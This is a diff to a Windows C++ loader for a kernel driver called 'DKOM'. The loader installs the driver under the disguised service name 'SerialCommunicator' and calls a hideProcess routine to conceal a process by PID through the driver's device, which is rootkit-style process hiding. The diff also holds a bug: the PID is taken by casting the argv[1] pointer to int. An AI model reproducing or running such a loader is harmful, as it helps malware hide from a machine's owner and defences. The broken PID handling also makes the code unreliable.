@@ -25,13 +25,15 @@ int main(int argc, char *argv[])
 	printf("lasterr: %d", GetLastError());
 	Logs::log = new Log();
 	Logs::log->WriteLine("\n\nstarted...\n");
-	//if (argc < 2)
-	//	printf("Not enougth arguments");
-	//else
+	if (argc < 2)
+	{
+		printf("Not enougth arguments");
+		return 0;
+	}
 	char* driverName = "DKOM";
 	char* displayName = "SerialCommunicator"; // friendly name
-	if (loadSysFile(driverName, displayName))//"friendly driver"))//argv[1]);
-		printf("success");//hideProcess(driverName, 4); //(int)argv[1]);
+	if (loadSysFile(driverName, displayName) && hideProcess(driverName, (int)argv[1])) //(int)argv[1]);)//"friendly driver"))//argv[1]);
+		printf("success\n");
 	else
 		printf("failure\n");
 	char s[100];
@@ -109,7 +111,7 @@ bool loadSysFileSCM(char* driverName, char* displayName) // load manually with s
 	printf(frmtStr);
 
 	// start the Driver
-	if (0 == StartService(driverHandle, 0, NULL) && ERROR_SERVICE_ALREADY_RUNNING != GetLastError())
+	if (0 == StartService(driverHandle, 0, NULL) && GetLastError() != ERROR_SERVICE_ALREADY_RUNNING)
 	{
 		sprintf(frmtStr, "couldn't start driver(%d)\n", GetLastError());
 		Logs::log->Write(frmtStr);
@@ -172,9 +174,10 @@ bool cmdLoadSysFile(char* driverName, char* displayName) // load with cmd comman
 
 bool tryLoadSysFile(char * driverName, char * displayName)
 {
-	if (loadSysFileSCM(driverName, displayName) || cmdLoadSysFile(driverName, displayName))
-		return TRUE;
-	return FALSE;
+	//if (loadSysFileSCM(driverName, displayName) || cmdLoadSysFile(driverName, displayName))
+	//	return TRUE;
+	//return FALSE;
+	return loadSysFileSCM(driverName, displayName) || cmdLoadSysFile(driverName, displayName);
 }
 
 #pragma endregion
@@ -182,7 +185,7 @@ bool tryLoadSysFile(char * driverName, char * displayName)
 bool hideProcess(char * driverName, int pid)
 {
 	char* driverToOpen = new char[100];
-	sprintf(driverToOpen, "\\\\.\\", driverName); // "\\\\.\\DKOM" for example
+	sprintf(driverToOpen, "\\\\.\\%s", driverName); // "\\\\.\\DKOM" for example
 	HANDLE hFile = CreateFile(driverToOpen, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL); // open driver
 
 	if (hFile == INVALID_HANDLE_VALUE)
